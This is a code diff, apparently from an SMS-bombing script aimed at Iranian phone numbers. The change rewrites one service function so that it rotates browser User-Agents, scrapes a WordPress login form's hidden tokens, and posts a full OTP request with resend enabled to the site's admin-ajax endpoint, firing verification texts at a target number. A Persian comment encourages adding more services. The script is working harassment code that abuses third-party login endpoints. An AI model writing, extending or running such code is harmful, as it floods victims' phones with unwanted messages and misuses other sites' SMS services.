@@ -154,21 +154,73 @@ def elanza(phone):
     except Exception as e:
         print(f"{r}[!] elanza Exception: {e}{a}")
 
-def ilozi(phone):
-    digits_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
-    try:
-        session = requests.Session()
-        url = "https://ilozi.com/wp-admin/admin-ajax.php"
-        payload = {"digits_phone": digits_phone, "action": "digits_forms_ajax"}
-        headers = {"User-Agent": "Mozilla/5.0"}
-        response = session.post(url, data=payload, headers=headers, timeout=10)
-        if response.status_code == 200:
-            print(f'{g}(ilozi) Code Sent to {phone}{a}')
-        else:
-            print(f"{r}[-] (ilozi) HTTP Error: {response.status_code}{a}")
-    except Exception as e:
-        print(f"{r}[!] ilozi Exception: {e}{a}")
+import requests
+import re
+import random
 
+def ilozi(phone):
+    try:
+        digits_phone = phone.replace("+98", "")
+        session = requests.Session()
+        
+        # لیست User-Agent های مختلف
+        user_agents = [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15"
+        ]
+        
+        headers = {
+            "User-Agent": random.choice(user_agents),
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "X-Requested-With": "XMLHttpRequest",
+            "Origin": "https://ilozi.com",
+            "Referer": "https://ilozi.com/?login=true&page=2",
+        }
+
+        # دریافت صفحه اول
+        home_response = session.get("https://ilozi.com/?login=true&page=2", 
+                                   timeout=10, headers=headers)
+        
+        # استخراج مقادیر مورد نیاز
+        instance_id = re.search(r'name="instance_id" value="([a-f0-9]+)"', home_response.text)
+        digits_form = re.search(r'name="digits_form" value="([a-f0-9]+)"', home_response.text)
+
+        # آماده سازی داده‌ها
+        payload = {
+            "login_digt_countrycode": "+98",
+            "digits_phone": digits_phone,
+            "action_type": "phone",
+            "sms_otp": "",
+            "otp_step_1": "1",
+            "digits_otp_field": "1",
+            "digits": "1",
+            "instance_id": instance_id.group(1) if instance_id else "6fb17492e0d343df4e533a9deb8ba6b9",
+            "action": "digits_forms_ajax",
+            "type": "login",
+            "digits_redirect_page": "https://ilozi.com/my-account/?action=register",
+            "digits_form": digits_form.group(1) if digits_form else "3780032f76",
+            "_wp_http_referer": "/?login=true&page=2",
+            "show_force_title": "1",
+            "otp_resend": "true",
+            "container": "digits_protected",
+            "sub_action": "sms_otp"
+        }
+
+        # ارسال درخواست
+        response = session.post("https://ilozi.com/wp-admin/admin-ajax.php", 
+                               data=payload, headers=headers, timeout=10)
+
+        # بررسی پاسخ
+        if response.status_code == 200:
+            if response.text.strip() == "1" or (response.json().get("success") if response.text else False):
+                return True
+        
+        return False
+            
+    except Exception:
+        return False
+        
 # ==========================
 # لیست سرویس‌ها (می‌توانی همه سرویس‌های V4 را اضافه کنی)
 # ==========================
